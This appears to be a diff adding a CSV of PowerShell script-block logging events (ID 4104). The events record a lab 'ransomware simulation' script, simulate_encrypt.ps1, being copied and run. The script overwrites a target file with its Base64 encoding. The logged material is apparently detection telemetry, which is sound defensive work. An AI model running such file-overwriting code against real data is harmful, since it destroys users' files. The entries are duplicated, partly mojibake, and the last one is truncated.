+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQpzCg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:11:17.527+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:11:23.047+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""C:\Program Files\data_important.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}
+s
+# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""C:\Program Files\data_important.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}
+s"
+"2025-11-16T08:12:21.121+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""992d546fe1dd40245d3dc46da3cddd660197c2c4"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""992d546fe1dd40245d3dc46da3cddd660197c2c4"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:12:21.269+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:12:21.358+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQpzCg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQpzCg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:12:21.395+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:12:23.390+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""data_important.txt.recovered.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}
+s
+# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi Ä‘Ã¨ vÃ o chÃ­nh file gá»‘c
+# QUAN TRá»ŒNG: File gá»‘c sáº½ bá»‹ thay Ä‘á»•i thÃ nh Base64
+
+param (
+    [string]$Path = ""data_important.txt.recovered.txt""
+)
+
+try {
+    Write-Host ""[*] Báº¯t Ä‘áº§u mÃ´ phá»ng... Äá»c file: $Path""
+    
+    # Kiá»ƒm tra file tá»“n táº¡i
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Lá»—i: KhÃ´ng tÃ¬m tháº¥y file má»¥c tiÃªu: $Path""
+        exit
+    }
+
+    # Äá»c ná»™i dung file gá»‘c
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Encode Base64 (mÃ´ phá»ng 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Ghi Ä‘Ã¨ ná»™i dung Base64 vÃ o chÃ­nh file gá»‘c
+    Set-Content -Path $Path -Value $base64Content -Encoding UTF8
+    
+    Write-Host ""[+] ThÃ nh cÃ´ng! File Ä‘Ã£ bá»‹ 'mÃ£ hÃ³a' (Base64).""
+    Write-Host ""[+] File hiá»‡n táº¡i: $Path""
+
+} catch {
+    Write-Error ""Gáº·p lá»—i: $($_.Exception.Message)""
+}
+s"
+"2025-11-16T08:13:05.783+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:13:05.940+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:13:06.039+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZT